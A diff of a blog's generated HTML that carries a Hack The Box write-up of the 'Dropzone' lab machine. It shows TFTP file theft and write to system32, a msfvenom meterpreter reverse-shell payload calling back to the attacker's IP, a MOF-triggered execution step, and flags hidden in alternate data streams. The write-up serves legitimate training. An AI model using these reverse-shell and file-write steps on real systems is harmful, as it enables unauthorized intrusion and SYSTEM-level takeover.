@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Dropzone | text/plain</title>
@@ -325,30 +325,30 @@ which only works after uploading the streams.exe tools from Sysinternals.</block
       <h1 id="enumeration">Enumeration</h1>
 <h2 id="port-scan">Port scan</h2>
 <p>As usual, start with a quick port scan to identify open ports for inspection:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.90
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-10-08 20:55:02 GMT
-</span></span><span style="display:flex;"><span>-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan
-</span></span><span style="display:flex;"><span>Scanning 1 hosts [65535 ports/host]
-</span></span></code></pre></div><p>Not a single open port was identified. Instead of debugging
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.90
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-10-08 20:55:02 GMT
+-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+</code></pre></div><p>Not a single open port was identified. Instead of debugging
 <a href="https://github.com/robertdavidgraham/masscan">masscan</a>, checking the VPN
 connection, trying out all sorts of firewall evasion techniques, or going crazy
 otherwise, remember port scans do TCP by default but can do UDP as well:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ masscan -e tun0 -p U:1-65535 --rate <span style="color:#ae81ff">2000</span> 10.10.10.90
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>Discovered open port 69/udp on 10.10.10.90
-</span></span></code></pre></div><p>Now there is an open port, suggesting a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">$ masscan -e tun0 -p U:1-65535 --rate <span style="color:#ae81ff">2000</span> 10.10.10.90
+...
+Discovered open port 69/udp on 10.10.10.90
+</code></pre></div><p>Now there is an open port, suggesting a
 <a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol">TFTP</a> service at
 UDP 69. With nmap we can find out more:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ nmap -sV -sC -sU -p 69 10.10.10.90
-</span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-14 17:00 EDT
-</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.90
-</span></span><span style="display:flex;"><span>Host is up (0.046s latency).
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>69/udp open  tftp    SolarWinds Free tftpd
-</span></span></code></pre></div><p>Nmap confirms there is TFTP running and identifies it as the <a href="https://www.solarwinds.com/">SolawWinds TFTP
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ nmap -sV -sC -sU -p 69 10.10.10.90
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-14 17:00 EDT
+Nmap scan report for 10.10.10.90
+Host is up (0.046s latency).
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>PORT   STATE SERVICE VERSION
+69/udp open  tftp    SolarWinds Free tftpd
+</code></pre></div><p>Nmap confirms there is TFTP running and identifies it as the <a href="https://www.solarwinds.com/">SolawWinds TFTP
 server</a>. A little bit of background: TFTP is a
 very minimalistic (&ldquo;trivial&rdquo;) file transfer protocol. It only supports uploading
 and downloading files. Listing directories, deleting files, authenticating
@@ -370,30 +370,30 @@ to look for (e.g.,
 <a href="https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/">here</a>).
 We connect with <code>tftp</code> and start with the basics. After connecting, you can use
 the <code>get</code> command to receive files. TFTP will let you know if the files exist:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ tftp 10.10.10.90
-</span></span><span style="display:flex;"><span>tftp&gt; get non-existing-file
-</span></span><span style="display:flex;"><span>Error code 1: Could not find file &#39;C:\non-existing-file&#39;.
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>tftp&gt; get WINDOWS\System32\drivers\etc\hosts
-</span></span><span style="display:flex;"><span>Received 734 bytes in 0.1 seconds [58720 bits/sec]
-</span></span></code></pre></div><p>After getting a file, you will find it in your current directory. So let&rsquo;s read
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ tftp 10.10.10.90
+tftp&gt; get non-existing-file
+Error code 1: Could not find file &#39;C:\non-existing-file&#39;.
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>tftp&gt; get WINDOWS\System32\drivers\etc\hosts
+Received 734 bytes in 0.1 seconds [58720 bits/sec]
+</code></pre></div><p>After getting a file, you will find it in your current directory. So let&rsquo;s read
 some interesting files. With <code>get /boot.ini</code>, we find out that the box runs
 Windows XP:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ cat boot.ini
-</span></span><span style="display:flex;"><span>[boot loader]
-</span></span><span style="display:flex;"><span>timeout=30
-</span></span><span style="display:flex;"><span>default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
-</span></span><span style="display:flex;"><span>[operating systems]
-</span></span><span style="display:flex;"><span>multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&#34;Microsoft Windows XP Professional&#34; /noexecute=optin /fastdetect
-</span></span></code></pre></div><p>Using <code>get /Windows/System32/eula.txt</code> we can further see it is Windows XP
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ cat boot.ini
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&#34;Microsoft Windows XP Professional&#34; /noexecute=optin /fastdetect
+</code></pre></div><p>Using <code>get /Windows/System32/eula.txt</code> we can further see it is Windows XP
 Professional Service Pack 3:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ head -n 6 eula.txt
-</span></span><span style="display:flex;"><span>END-USER LICENSE AGREEMENT FOR MICROSOFT
-</span></span><span style="display:flex;"><span>SOFTWARE
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>MICROSOFT WINDOWS XP PROFESSIONAL EDITION
-</span></span><span style="display:flex;"><span>SERVICE PACK 3
-</span></span></code></pre></div><p>After that, I spent some time poking around the system to find sensitive files
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ head -n 6 eula.txt
+END-USER LICENSE AGREEMENT FOR MICROSOFT
+SOFTWARE
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>MICROSOFT WINDOWS XP PROFESSIONAL EDITION
+SERVICE PACK 3
+</code></pre></div><p>After that, I spent some time poking around the system to find sensitive files
 or hints about other services that may run. For instance, you can also <code>get windows\repair\SAM</code> and probably could extract some password hashes. But that
 is all useless as all you can do is connect to the TFTP server.</p>
 <h1 id="exploiting-tftp">Exploiting TFTP</h1>
@@ -401,24 +401,24 @@ is all useless as all you can do is connect to the TFTP server.</p>
 Check <code>searchsploit</code> and it returns a long list of DOS attacks and a directory
 traversals. Not much useful information here, since we know already that we can
 read pretty much everything.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ searchsploit solarwinds
-</span></span><span style="display:flex;"><span>----------------------------------------------------------------------- ----------------------------------------
-</span></span><span style="display:flex;"><span> Exploit Title                                                         |  Path
-</span></span><span style="display:flex;"><span>                                                                       | (/usr/share/exploitdb/)
-</span></span><span style="display:flex;"><span>----------------------------------------------------------------------- ----------------------------------------
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>SolarWinds TFTP Server 10.4.0.10 - Denial of Service                   | exploits/windows/dos/12683.pl
-</span></span><span style="display:flex;"><span>SolarWinds TFTP Server 10.4.0.13 - Denial of Service                   | exploits/windows/dos/13836.py
-</span></span><span style="display:flex;"><span>SolarWinds TFTP Server 9.2.0.111 - Remote Denial of Service            | exploits/windows/dos/9547.pl
-</span></span><span style="display:flex;"><span>SolarWinds TFTP Server Standard Edition 5.0.55 - Directory Traversal   | exploits/windows/remote/21964.txt
-</span></span><span style="display:flex;"><span>SolarWinds TFTP Server Standard Edition 5.0.55 - Large UDP Packet      | exploits/windows/dos/21963.pl
-</span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><p>What is interesting though is that we seem to be able to write files on the remote
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ searchsploit solarwinds
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+...
+SolarWinds TFTP Server 10.4.0.10 - Denial of Service                   | exploits/windows/dos/12683.pl
+SolarWinds TFTP Server 10.4.0.13 - Denial of Service                   | exploits/windows/dos/13836.py
+SolarWinds TFTP Server 9.2.0.111 - Remote Denial of Service            | exploits/windows/dos/9547.pl
+SolarWinds TFTP Server Standard Edition 5.0.55 - Directory Traversal   | exploits/windows/remote/21964.txt
+SolarWinds TFTP Server Standard Edition 5.0.55 - Large UDP Packet      | exploits/windows/dos/21963.pl
+...
+</code></pre></div><p>What is interesting though is that we seem to be able to write files on the remote
 system to any location, e.g., into the &ldquo;system32&rdquo; folder, which should be
 protected:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tftp&gt; put eula.txt /Windows/system32/eula.txt
-</span></span><span style="display:flex;"><span>Sent 41543 bytes in 5.0 seconds
-</span></span></code></pre></div><p>This observation either gives you the right idea, or you spend some quality time with
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">tftp&gt; put eula.txt /Windows/system32/eula.txt
+Sent 41543 bytes in 5.0 seconds
+</code></pre></div><p>This observation either gives you the right idea, or you spend some quality time with
 Google until you discover how the ability to write files on Windows XP can help
 you. Below a summary of my journey:</p>
 <h2 id="ms10-046-and-lnk-files---wont-work">MS10-046 and LNK files - won&rsquo;t work</h2>
@@ -501,65 +501,65 @@ box)</li>
 </ul>
 <p>Now we have a &ldquo;bad.mof&rdquo; file and are ready to go. The rest is easy. Build a
 payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.147 LPORT=443 -f exe -o bad.exe
-</span></span><span style="display:flex;"><span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-</span></span><span style="display:flex;"><span>[-] No arch selected, selecting arch: x86 from the payload
-</span></span><span style="display:flex;"><span>No encoder or badchars specified, outputting raw payload
-</span></span><span style="display:flex;"><span>Payload size: 341 bytes
-</span></span><span style="display:flex;"><span>Final size of exe file: 73802 bytes
-</span></span><span style="display:flex;"><span>Saved as: bad.exe
-</span></span></code></pre></div><p>Then upload the payload first, followed by the MOF file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ tftp 10.10.10.90
-</span></span><span style="display:flex;"><span>tftp&gt; binary
-</span></span><span style="display:flex;"><span>tftp&gt; put bad.exe /WINDOWS/system32/bad.exe
-</span></span><span style="display:flex;"><span>Sent 73802 bytes in 8.7 seconds
-</span></span><span style="display:flex;"><span>tftp&gt; put bad.mof /WINDOWS/system32/wbem/mof/bad.mof
-</span></span><span style="display:flex;"><span>Sent 707 bytes in 0.2 seconds
-</span></span></code></pre></div><p>Finally, catch a meterpreter session and be system (start this handler before
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.147 LPORT=443 -f exe -o bad.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: bad.exe
+</code></pre></div><p>Then upload the payload first, followed by the MOF file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ tftp 10.10.10.90
+tftp&gt; binary
+tftp&gt; put bad.exe /WINDOWS/system32/bad.exe
+Sent 73802 bytes in 8.7 seconds
+tftp&gt; put bad.mof /WINDOWS/system32/wbem/mof/bad.mof
+Sent 707 bytes in 0.2 seconds
+</code></pre></div><p>Finally, catch a meterpreter session and be system (start this handler before
 uploading &ldquo;bad.mof&rdquo;!):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>msf &gt; use exploit/multi/handler
-</span></span><span style="display:flex;"><span>msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
-</span></span><span style="display:flex;"><span>payload =&gt; windows/meterpreter/reverse_tcp
-</span></span><span style="display:flex;"><span>msf exploit(multi/handler) &gt; set LHOST 10.10.15.147
-</span></span><span style="display:flex;"><span>LHOST =&gt; 10.10.15.147
-</span></span><span style="display:flex;"><span>msf exploit(multi/handler) &gt; set LPORT 443
-</span></span><span style="display:flex;"><span>LPORT =&gt; 443
-</span></span><span style="display:flex;"><span>msf exploit(multi/handler) &gt; run
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Started reverse TCP handler on 10.10.15.147:443
-</span></span><span style="display:flex;"><span>[*] Sending stage (179779 bytes) to 10.10.10.90
-</span></span><span style="display:flex;"><span>[*] Meterpreter session 1 opened (10.10.15.147:443 -&gt; 10.10.10.90:1426) at 2018-10-14 16:50:15 -0400
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY\SYSTEM
-</span></span></code></pre></div><p>If things don&rsquo;t work as expected, check the MOF compilation logs for errors.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set LHOST 10.10.15.147
+LHOST =&gt; 10.10.15.147
+msf exploit(multi/handler) &gt; set LPORT 443
+LPORT =&gt; 443
+msf exploit(multi/handler) &gt; run
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>[*] Started reverse TCP handler on 10.10.15.147:443
+[*] Sending stage (179779 bytes) to 10.10.10.90
+[*] Meterpreter session 1 opened (10.10.15.147:443 -&gt; 10.10.10.90:1426) at 2018-10-14 16:50:15 -0400
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div><p>If things don&rsquo;t work as expected, check the MOF compilation logs for errors.
 You can get them with TFTP like so:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tftp&gt; get /WINDOWS/system32/wbem/Logs/mofcomp.log
-</span></span><span style="display:flex;"><span>Received 15235 bytes in 1.8 seconds
-</span></span></code></pre></div><p>A working MOF file should produce this two entries:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
-</span></span><span style="display:flex;"><span>(Sun Oct 14 23:17:35 2018.116593562) : Finished compiling file:C:\WINDOWS\system32\wbem\mof\bad.mof
-</span></span></code></pre></div><p>Any mistake in the MOF file causes the logs to look like below. For instance,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">tftp&gt; get /WINDOWS/system32/wbem/Logs/mofcomp.log
+Received 15235 bytes in 1.8 seconds
+</code></pre></div><p>A working MOF file should produce this two entries:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
+(Sun Oct 14 23:17:35 2018.116593562) : Finished compiling file:C:\WINDOWS\system32\wbem\mof\bad.mof
+</code></pre></div><p>Any mistake in the MOF file causes the logs to look like below. For instance,
 this happens if you use the VBScript-based MOF file described in the article
 above.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
-</span></span><span style="display:flex;"><span>(Sun Oct 14 22:46:26 2018.114724406) : An error occurred while processing item 4 defined on lines 22 - 26 in file C:\WINDOWS\system32\wbem\mof\bad.mof:
-</span></span><span style="display:flex;"><span>(Sun Oct 14 22:46:26 2018.114724406) : Error Number: 0x80010117, Facility: RPC
-</span></span><span style="display:flex;"><span>Description: Call context cannot be accessed after call completed.
-</span></span></code></pre></div><h1 id="getting-the-flag-from-ads">Getting the flag from ADS</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
+(Sun Oct 14 22:46:26 2018.114724406) : An error occurred while processing item 4 defined on lines 22 - 26 in file C:\WINDOWS\system32\wbem\mof\bad.mof:
+(Sun Oct 14 22:46:26 2018.114724406) : Error Number: 0x80010117, Facility: RPC
+Description: Call context cannot be accessed after call completed.
+</code></pre></div><h1 id="getting-the-flag-from-ads">Getting the flag from ADS</h1>
 <p>Even though you are system already, the is one tiny little step left to get the
 flag. If you try to read it in a shell session, you get this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
-</span></span><span style="display:flex;"><span>type root.txt
-</span></span><span style="display:flex;"><span>It&#39;s easy, but not THAT easy...
-</span></span></code></pre></div><p>Obviously, the flag cannot be here since TFTP would have been enough to just
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+type root.txt
+It&#39;s easy, but not THAT easy...
+</code></pre></div><p>Obviously, the flag cannot be here since TFTP would have been enough to just
 get it. But there is a &ldquo;flags&rdquo; directory, in which you see an interesting file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>C:\Documents and Settings\Administrator\Desktop\flags&gt;type &#34;2 for the price of 1!.txt&#34;
-</span></span><span style="display:flex;"><span>type &#34;2 for the price of 1!.txt&#34;
-</span></span><span style="display:flex;"><span>For limited time only!
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Keep an eye on our ADS for new offers &amp; discounts!
-</span></span></code></pre></div><p>ADS refers to <a href="https://docs.microsoft.com/en-us/windows/desktop/fileio/file-streams">Alternative Data
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop\flags&gt;type &#34;2 for the price of 1!.txt&#34;
+type &#34;2 for the price of 1!.txt&#34;
+For limited time only!
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>Keep an eye on our ADS for new offers &amp; discounts!
+</code></pre></div><p>ADS refers to <a href="https://docs.microsoft.com/en-us/windows/desktop/fileio/file-streams">Alternative Data
 Streams</a>,
 a feature of NTFS that is sometimes abused to hide data (see this
 <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">article</a>).
@@ -570,22 +570,22 @@ it to the box with meterpreter (or download with
 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">certutil</a>
 if you chose a plain CMD session as payload). Now you can read the stream
 names, which are the flags:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>C:\Documents and Settings\Administrator\Desktop\flags&gt;streams -accepteula -s .
-</span></span><span style="display:flex;"><span>streams -accepteula -s .
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>streams v1.60 - Reveal NTFS alternate streams.
-</span></span><span style="display:flex;"><span>Copyright (C) 2005-2016 Mark Russinovich
-</span></span><span style="display:flex;"><span>Sysinternals - www.sysinternals.com
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>C:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt:
-</span></span><span style="display:flex;"><span>   :root_txt_&lt;root-flag-here&gt;:$DATA     5
-</span></span><span style="display:flex;"><span>   :user_txt_&lt;user-flag-here&gt;:$DATA     5
-</span></span></code></pre></div><p>Just for completeness, here is how you could read the stream data if the flags
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop\flags&gt;streams -accepteula -s .
+streams -accepteula -s .
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>streams v1.60 - Reveal NTFS alternate streams.
+Copyright (C) 2005-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>C:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt:
+   :root_txt_&lt;root-flag-here&gt;:$DATA     5
+   :user_txt_&lt;user-flag-here&gt;:$DATA     5
+</code></pre></div><p>Just for completeness, here is how you could read the stream data if the flags
 had been stored inside:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>C:\Documents and Settings\Administrator\Desktop\flags&gt;more &lt; &#34;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&#34;
-</span></span><span style="display:flex;"><span>more &lt; &#34;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&#34;
-</span></span><span style="display:flex;"><span>&#34;&#34;
-</span></span></code></pre></div><h1 id="references">References</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop\flags&gt;more &lt; &#34;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&#34;
+more &lt; &#34;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&#34;
+&#34;&#34;
+</code></pre></div><h1 id="references">References</h1>
 <ul>
 <li>Interesting blog posts that explain in great detail how MOF files are
 written, what WMI is and how they fit in to the bigger picture are
@@ -637,7 +637,7 @@ interesting. Nice articled with more details are
         <time datetime="12M">12 minutes</time>
       
         <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-        <time datetime="9M">9 minutes</time>
+        <time datetime="10M">10 minutes</time>
       
         <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
         <time datetime="8M">8 minutes</time>
